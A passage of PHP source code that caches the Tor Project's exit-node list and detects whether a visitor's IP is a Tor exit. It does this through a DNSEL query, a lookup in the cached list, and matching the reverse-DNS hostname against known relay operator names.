        } else {
            $ips = array_filter(array_map('trim', explode("\n", $raw)));
        }

        if (!empty($ips)) {
            @file_put_contents($cacheFile, implode("\n", array_unique($ips)) . "\n");
            @chmod($cacheFile, 0640);
        }
    }
}

/**
 * Search the cached Tor bulk exit list for a given IP address.
 *
 * @param  string $ip       IP address to look up
 * @param  string $dataDir  Absolute path to the data/ directory
 * @return bool             True if found in cache
 */
function checkTorBulkList(string $ip, string $dataDir): bool
{
    $cacheFile = $dataDir . '/.tor_exit_cache';
    if (!is_file($cacheFile)) {
        return false;
    }
    $normalizedIP = strtolower(trim($ip));
    $handle = @fopen($cacheFile, 'r');
    if (!$handle) {
        return false;
    }
    $found = false;
    while (($line = fgets($handle)) !== false) {
        if (strtolower(trim($line)) === $normalizedIP) {
            $found = true;
            break;
        }
    }
    fclose($handle);
    return $found;
}

/**
 * Detect whether an IP address belongs to a Tor exit node.
 *
 * Checks:
 *   1. Real-time DNSEL query (IPv4)
 *   2. Tor Project official exit-addresses cache (IPv4 + IPv6)
 *   3. Reverse DNS host & ISP pattern matching (e.g. KEFF-STO, tor-exit, tornode)
 *
 * @param  string $ip       IP address to check
 * @param  string $dataDir  Absolute path to data/
 * @return bool             True if confirmed Tor exit node
 */
function detectTorExit(string $ip, string $dataDir): bool
{
    if ($ip === '' || $ip === 'unknown') {
        return false;
    }

    /* ── 1. IPv4: real-time DNSEL query ─────────────────────────── */
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        $reversed = implode('.', array_reverse(explode('.', $ip)));
        $host     = $reversed . '.dnsel.torproject.org';
        $resolved = @gethostbyname($host);
        if ($resolved === '127.0.0.2') {
            return true;
        }
    }

    /* ── 2. Cache lookup (IPv4 & IPv6 exit-addresses) ────────────── */
    refreshTorCache($dataDir);
    if (checkTorBulkList($ip, $dataDir)) {
        return true;
    }

    /* ── 3. Reverse DNS & Hostname Heuristics ───────────────────── */
    $host = @gethostbyaddr($ip);
    if ($host && $host !== $ip) {
        $hostLower = strtolower($host);
        $torSignatures = [
            'tor-exit', 'tornode', 'tor.exit', 'tor-relay', 'torrelay',
            'torservers', 'calyxinstitute', 'bouazizi', 'keff-sto',
            'nos-oignons', 'theonionrouter', 'exit-node', 'exitnode',
            'tor-node', 'relays.torproject'
        ];
        foreach ($torSignatures as $sig) {
            if (strpos($hostLower, $sig) !== false) {
                return true;
            }
        }
    }

    return false;
}
